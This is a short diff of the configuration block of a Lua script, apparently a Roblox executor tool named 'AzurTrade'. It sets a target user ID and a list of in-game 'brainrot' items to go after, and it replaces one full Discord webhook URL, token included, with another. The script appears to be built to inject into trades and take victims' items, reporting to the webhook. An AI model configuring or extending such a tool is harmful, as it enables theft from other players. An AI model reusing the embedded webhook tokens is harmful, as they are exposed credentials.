@@ -1,6 +1,6 @@
 -- [[ CONFIGURATION ]] --
 getgenv().TARGET_ID = 9372830276 
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1477394442527707238/WYuGV1UrpM7M8e91KfrR2nEq5xVLA2QcqOAO6iULR2uPIs9aLTaRddTTSiiv_DwB-4Jt"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1475941874224201780/T198kD49fD4v-IuKcLteAjlJOj5lfbP5WczKjVo4VwnhC949X_f31lXiAQPQypWCWQ-x"
 getgenv().TARGET_BRAINROTS = {
     ["Dragon Gingerini"] = true, ["Skibidi Toilet"] = true, ["Meowl"] = true,
     ["Headless Horseman"] = true, ["Dragon Cannelloni"] = true, ["Cooki and Milki"] = true,
@@ -23,7 +23,6 @@ getgenv().TARGET_BRAINROTS = {
     ["Capitano Moby"] = true, ["Rosey and Teddy"] = true,
     ["Hydra Dragon Cannelloni"] = true,
 }
-
 if getgenv().AzurTradeInjected_v17 then return end
 getgenv().AzurTradeInjected_v17 = true
 
